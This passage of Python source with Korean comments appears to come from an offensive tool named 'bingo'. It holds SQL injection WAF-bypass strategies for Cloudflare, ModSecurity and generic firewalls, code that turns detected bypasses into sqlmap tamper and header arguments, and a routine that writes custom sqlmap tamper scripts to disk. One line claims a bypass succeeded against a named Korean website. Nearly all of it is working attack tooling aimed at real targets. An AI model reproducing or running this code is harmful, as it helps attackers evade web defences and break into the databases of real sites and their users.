1. 공백 → %0a (URL 인코딩된 줄바꿈): 'UNION%0aSELECT'
2. 공백 → /**/ (MySQL 인라인 주석): 'UNION/**/SELECT'
3. 키워드 MySQL 조건부 주석: '/*!UNION*/ /*!SELECT*/'
4. X-Forwarded-For 헤더로 내부 IP 위장
5. User-Agent를 Googlebot으로 변경
실전: urimoney.co.kr에서 %0a, /**/ 우회 성공 확인""",

            "cloudflare": """
Cloudflare WAF 우회 전략:
1. URL 더블 인코딩: %27 → %2527
2. Unicode 변형: SELECT → U+0053ELECT
3. Case mixing: SeLeCt
4. 인라인 주석: UN/**/ION SE/**/LECT
5. 느린 전송 (chunked transfer)
6. Cloudflare JS Challenge 시 실제 브라우저 필요""",

            "modsecurity": """
ModSecurity WAF 우회 전략:
1. 공백 다양화: tab(%09), newline(%0a), /**/, /*!*/
2. 대소문자 혼합: SeLeCt, UnIoN
3. HTML 인코딩: SELECT → S&#69;LECT
4. 중복 URL 인코딩
5. NULL 바이트 삽입: SEL%00ECT
6. HTTP Parameter Pollution""",

            "generic": """
범용 WAF 우회 전략 (순서대로 시도):
1. 공백 변형: /**/, %09, %0a, %0d%0a
2. 키워드 인라인 주석: /*!UNION*/
3. X-Forwarded-For: 127.0.0.1
4. URL 더블 인코딩
5. 대소문자 혼합
6. HEX 인코딩: 0x41 대신 A
[고급] 7. IF → CASE WHEN (함수 차단 시)
[고급] 8. SLEEP → 무거운 서브쿼리 (timing 유지)
[고급] 9. HTTP Chunked 분할 전송""",

            "_advanced": """
[고급 기법 전체 목록]
─── SQL 함수 대체 ───
• IF(a,b,c) → CASE/**/WHEN/**/a/**/THEN/**/b/**/ELSE/**/c/**/END
• SLEEP(n)  → 무거운 서브쿼리 (information_schema 대규모 조인)
• BENCHMARK → 동일 서브쿼리 대체
• GREATEST(a,b) 활용 — = 비교 없이 최댓값 비교
• AND/OR → &&/|| (키워드 차단 시)
• UNION SELECT → UNION%0aSELECT

─── Unicode/인코딩 고급 ───
• 전각 문자: ' → \uff07  " → \uff02
• Overlong UTF-8: / → %c0%af
• NULL 바이트: UNION%00SELECT
• HTML 엔티티: S&#69;LECT, UNI&#79;N

─── HTTP 프로토콜 ───
• Chunked Transfer: body를 3~7 byte씩 분할 전송
• 단일 기법 실패 → 함수대체+공백+헤더 3중 조합 자동 시도""",
        }
        return summaries.get(waf_type, summaries["generic"])

    # ── sqlmap tamper 스크립트에 대응하는 변환 함수 맵 ────────────────
    # bingo 우회 기법 → sqlmap tamper 이름 (없으면 커스텀 생성)
    _TECHNIQUE_TO_TAMPER: dict[str, list[str]] = {
        "space":        ["space2comment", "space2mysqlblank"],
        "newline":      ["space2comment"],
        "mysql_comment":["space2comment"],
        "keyword":      ["randomcase", "between"],
        "case":         ["randomcase"],
        "encoding":     ["charencode", "percentage"],
        "encode":       ["charencode"],
        "double":       ["chardoubleencode"],
        "unicode":      ["charunicodeencode"],
        "combined":     ["space2comment", "between", "charencode", "randomcase"],
    }

    def to_sqlmap_args(
        self,
        waf_result: "WafDetectResult",
        bypass_attempt: "BypassAttempt | None",
    ) -> str:
        """
        WAF 탐지 + 우회 성공 결과를 sqlmap 명령 인자로 변환.
        - 알려진 기법 → tamper 스크립트 이름
        - 알 수 없는 커스텀 기법 → tamper 스크립트 자동 생성 후 경로 포함
        반환값: sqlmap에 붙일 추가 인자 문자열
        """
        args: list[str] = []
        tampers: list[str] = []

        waf_lower = (waf_result.waf_type or "").lower()

        # WAF 종류별 기본 tamper
        if "cloudflare" in waf_lower:
            tampers += ["space2comment", "between", "charencode", "randomcase"]
        elif "aws" in waf_lower:
            tampers += ["space2mysqlblank", "equaltolike", "greatest"]
        elif "modsecurity" in waf_lower or "mod_security" in waf_lower:
            tampers += ["space2comment", "between", "modsecurityversioned"]
        elif "akamai" in waf_lower:
            tampers += ["space2comment", "between", "charencode"]
        else:
            tampers += ["space2comment", "between", "charencode"]

        if bypass_attempt:
            tech = bypass_attempt.technique.lower()

            # 알려진 기법 → tamper 이름 매핑
            matched = False
            for key, mapped_tampers in self._TECHNIQUE_TO_TAMPER.items():
                if key in tech:
                    for t in mapped_tampers:
                        if t not in tampers:
                            tampers.append(t)
                    matched = True

            # 헤더 기반 우회 → --headers 로 직접 전달
            if "header" in tech and bypass_attempt.headers_used:
                header_str = "\\n".join(
                    f"{k}: {v}" for k, v in bypass_attempt.headers_used.items()
                )
                args.append(f'--headers="{header_str}"')

            if "ua" in tech:
                args.append("--random-agent")

            # 알 수 없는 커스텀 기법 → tamper 스크립트 자동 생성 (방법 2)
            if not matched and "header" not in tech and "ua" not in tech:
                custom_path = self._generate_custom_tamper(bypass_attempt)
                if custom_path:
                    tampers.append(str(custom_path))

            # 방법 1: prefix/suffix — 성공한 실제 페이로드의 변환 패턴 반영
            if bypass_attempt.payload_original and bypass_attempt.payload_modified:
                orig = bypass_attempt.payload_original
                modified = bypass_attempt.payload_modified
                # 앞/뒤 공통 부분 추출해서 prefix/suffix 계산
                prefix, suffix = self._extract_prefix_suffix(orig, modified)
                if prefix:
                    args.append(f'--prefix="{prefix}"')
                if suffix:
                    args.append(f'--suffix="{suffix}"')

        if tampers:
            args.append(f"--tamper={','.join(tampers)}")

        # 공통 안전 옵션
        args += ["--delay=2", "--random-agent", "--level=3", "--risk=2", "--batch"]

        return " ".join(args)

    def _generate_custom_tamper(self, attempt: "BypassAttempt") -> "Path | None":
        """
        sqlmap tamper 스크립트에 없는 커스텀 우회 기법을
        Python tamper 스크립트로 자동 생성 → ~/.sqlmap/tamper/ 에 저장
        """
        import hashlib
        import re as _re
        from pathlib import Path

        orig = attempt.payload_original
        modified = attempt.payload_modified
        if not orig or not modified or orig == modified:
            return None

        # 변환 패턴 분석
        transforms: list[str] = []

        # 공백 치환 감지
        orig_spaces = orig.count(" ")
        if orig_spaces > 0:
            # 공백이 무엇으로 바뀌었는지 추출
            sample_replacement = None
            for i, (a, b) in enumerate(zip(orig, modified)):
                if a == " " and b != " ":
                    # 치환된 문자열 길이 추정
                    end = i + 1
                    while end < len(modified) and modified[end] not in orig:
                        end += 1
                    sample_replacement = modified[i:end]
                    break
            if sample_replacement:
                escaped = repr(sample_replacement)
                transforms.append(
                    f'        payload = payload.replace(" ", {escaped})'
                )

        # URL 인코딩 감지 (%xx)
        if _re.search(r"%[0-9A-Fa-f]{2}", modified) and "%" not in orig:
            transforms.append(
                "        import urllib.parse\n"
                "        payload = urllib.parse.quote(payload, safe='=&')"
            )

        if not transforms:
            return None

        body = "\n".join(transforms)
        script_name = "bingo_custom_" + hashlib.md5(modified.encode()).hexdigest()[:8]
        script_code = f'''#!/usr/bin/env python
"""
Auto-generated by bingo WAF bypass engine.
Technique: {attempt.technique}
"""
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL


def dependencies():
    pass


def tamper(payload, **kwargs):
    if payload:
{body}
    return payload
'''
        tamper_dir = Path.home() / ".sqlmap" / "tamper"
        tamper_dir.mkdir(parents=True, exist_ok=True)
        script_path = tamper_dir / f"{script_name}.py"
        script_path.write_text(script_code, encoding="utf-8")
        return script_path

    def _extract_prefix_suffix(
        self, original: str, modified: str
    ) -> tuple[str, str]:
        """변환된 페이로드에서 prefix/suffix 패턴 추출"""
        # 공통 앞부분
        prefix = ""
        for i, (a, b) in enumerate(zip(original, modified)):
            if a == b:
                prefix += a
            else:
                break
        # 공통 뒷부분
        suffix = ""
        for a, b in zip(reversed(original), reversed(modified)):
            if a == b:
                suffix = a + suffix
            else:
                break
        # 원본과 동일하면 의미 없음
        if prefix == original[:len(prefix)] and suffix == original[-len(suffix):]:
            return "", ""
        return prefix, suffix
